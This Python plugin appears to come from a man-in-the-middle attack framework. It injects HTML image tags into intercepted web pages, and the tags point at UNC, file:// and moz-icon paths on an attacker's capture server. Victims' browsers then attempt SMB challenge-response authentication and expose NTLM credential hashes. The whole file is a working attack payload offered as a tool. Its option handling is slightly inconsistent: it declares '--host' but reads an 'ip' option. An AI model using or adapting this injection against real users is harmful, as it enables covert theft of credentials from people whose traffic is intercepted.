from plugins.plugin import Plugin
from plugins.Inject import Inject

class SMBAuth(Inject,Plugin):
    name = "SMBAuth"
    optname = "smbauth"
    desc = "Evoke SMB challenge-response auth attempts"
    
    def initialize(self,options):
        Inject.initialize(self,options)
        self.target_ip = options.ip
        self.html_payload = self._get_data()

    def add_options(self,options):
        options.add_argument("--host", action="store_true", help="The ip address of your capture server")
    
    def _get_data(self):
        return '<img src=\"\\\\%s\\image.jpg\">'\
                '<img src=\"file://///%s\\image.jpg\">'\
                '<img src=\"moz-icon:file:///%%5c/%s\\image.jpg\">'\
                    % tuple([self.target_ip]*3)
